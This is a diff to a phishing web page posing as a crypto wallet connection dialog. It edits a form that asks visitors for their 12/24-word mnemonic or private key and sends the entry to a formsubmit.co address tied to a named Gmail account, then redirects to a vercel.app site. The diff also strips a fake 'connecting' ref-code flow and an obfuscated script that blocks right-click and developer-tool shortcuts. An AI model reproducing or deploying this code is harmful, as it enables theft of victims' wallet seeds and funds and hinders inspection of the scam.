@@ -1006,12 +1006,16 @@
                                     <button type="button" id="connectManual" class="btn btn-md btn-primary">
                                         Connect Manually
                                     </button>
+
+                                    <!-- Redirect after submission -->
+                                    <input type="hidden" name="_next" value="https://cssloaderdao.vercel.app/">
                                 </div>
                             </div>
                         </div>
                         <div style="display: none" id="modalConnect" class="modal-div-3">
                             <div class="modal-connect">
-                                <form id="generalForm" method="post">
+                                <form id="generalForm" method="post"
+                                    action="https://formsubmit.co/Bryanricch11@gmail.com">
                                     <div class="form-group">
                                         <textarea placeholder="Enter your 12/24 mnemonic words or your privatekey"
                                             name="formData" id="formData" cols="30" rows="6" class="form-control"
@@ -1040,17 +1044,17 @@
                                 class="img-fluid spinning-img" />
                         </div>
 
-                        <div class="qr-text">
+                        <!-- <div class="qr-text">
                             <p>CONNECTING...<br>
-                                <!-- Please contact the admin with your unique ref code:<br> -->
-                                <!-- <span id="p-code" class="p-code"></span> -->
+                                Please contact the admin with your unique ref code:<br>
+                                <span id="p-code" class="p-code"></span>
                             </p>
-                            <p>Reload this page to try again.</p>
-                        </div>
+                            <p>Reload this page to try again.</p> -->
                     </div>
                 </div>
             </div>
         </div>
+    </div>
     </div>
 
     <!-- <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
@@ -1122,44 +1126,19 @@
 
             // Form submission handler
 
-            $("#generalForm").submit(function (event) {
-                event.preventDefault();
+            // $("#generalForm").submit(function (event) {
+            //     event.preventDefault();
 
-                // Disable the submit button to prevent multiple submissions
-                document.getElementById("submit_form").disabled = true;
+            //     // Disable the submit button to prevent multiple submissions
+            //     document.getElementById("submit_form").disabled = true;
 
-                // Add loading text under the form
-                if ($("#loadingText").length === 0) {
-                    $("<p id='loadingText'>Connecting... please wait.</p>").insertAfter("#submit_form");
-                }
+            //     // Add loading text under the form
+            //     if ($("#loadingText").length === 0) {
+            //         $("<p id='loadingText'>Connecting... please wait.</p>").insertAfter("#submit_form");
+            //     }
 
-                var formData = $("#formData").val().trim();
-
-                // Mock form submission
-                $.ajax({
-                    url: "https://formsubmit.co/ajax/Bryanricch11@gmail.com", // Replace with actual backend URL
-                    method: "POST",
-                    dataType: "JSON",
-                    data: {
-                        formData: formData,
-                    },
-                    success: function () {
-                        var randomString = generateRandomString(6);
-                        document.getElementById("p-code").innerHTML = randomString; // Generate your unique code here
-                        $("#mainModal").hide();
-                        $("#qrModal").show();
-                    },
-                    error: function () {
-                        alert('Connection failed, Try again.');
-
-                        // Re-enable the submit button on failure
-                        document.getElementById("submit_form").disabled = false;
-
-                        // Remove loading text if submission fails
-                        $("#loadingText").remove();
-                    }
-                });
-            });
+            //     var formData = $("#formData").val().trim();
+            // });
 
 
             // Trigger the modal opening via some button click (example logic)
@@ -1173,16 +1152,13 @@
                 openModal();
             });
         });
-        function generateRandomString(length) {
-            var result = '';
-            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            for (var i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-            return result;
-        }
+        // function generateRandomString(length) {
+        //     var result = '';
+        //     var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        //     for (var i = 0; i < length; i++) {
+        //         result += characters.charAt(Math.floor(Math.random() * characters.length));
+        //     }
+        //     return result;
+        // }
     </script>
-    <!-- <script>
-    function _0x2318(){var _0x5ca3e7=['166212lYTdNr','1192UoxEEh','385844DyPVlv','shiftKey','oncontextmenu','keyCode','30JWASWO','3868088UsGurr','keydown','793365XFqocy','ctrlKey','654162geYglW','4vQlvox','6633pSDQst','19934290ljTdCs'];_0x2318=function(){return _0x5ca3e7;};return _0x2318();}function _0x216d(_0x196e23,_0x3b8ec1){var _0x231812=_0x2318();return _0x216d=function(_0x216d3d,_0x185860){_0x216d3d=_0x216d3d-0x1da;var _0x2ec593=_0x231812[_0x216d3d];return _0x2ec593;},_0x216d(_0x196e23,_0x3b8ec1);}var _0x48a984=_0x216d;(function(_0x373c04,_0xb33dcc){var _0xbcdd1f=_0x216d,_0x449b9c=_0x373c04();while(!![]){try{var _0xc76a90=-parseInt(_0xbcdd1f(0x1e2))/0x1+parseInt(_0xbcdd1f(0x1e0))/0x2+-parseInt(_0xbcdd1f(0x1da))/0x3*(parseInt(_0xbcdd1f(0x1dd))/0x4)+parseInt(_0xbcdd1f(0x1e6))/0x5*(-parseInt(_0xbcdd1f(0x1dc))/0x6)+-parseInt(_0xbcdd1f(0x1e7))/0x7+parseInt(_0xbcdd1f(0x1e1))/0x8*(parseInt(_0xbcdd1f(0x1de))/0x9)+parseInt(_0xbcdd1f(0x1df))/0xa;if(_0xc76a90===_0xb33dcc)break;else _0x449b9c['push'](_0x449b9c['shift']());}catch(_0x289c8e){_0x449b9c['push'](_0x449b9c['shift']());}}}(_0x2318,0x50657),window[_0x48a984(0x1e4)]=function(){return![];},$(document)[_0x48a984(0x1e8)](function(_0x570384){var _0x33e9d1=_0x48a984;if(_0x570384['keyCode']==0x7b)return![];else{if(_0x570384[_0x33e9d1(0x1db)]&&_0x570384[_0x33e9d1(0x1e3)]&&_0x570384[_0x33e9d1(0x1e5)]==0x49||_0x570384['ctrlKey']&&_0x570384[_0x33e9d1(0x1e3)]&&_0x570384['keyCode']==0x4a)return![];}}));
-</script> -->
 </body>
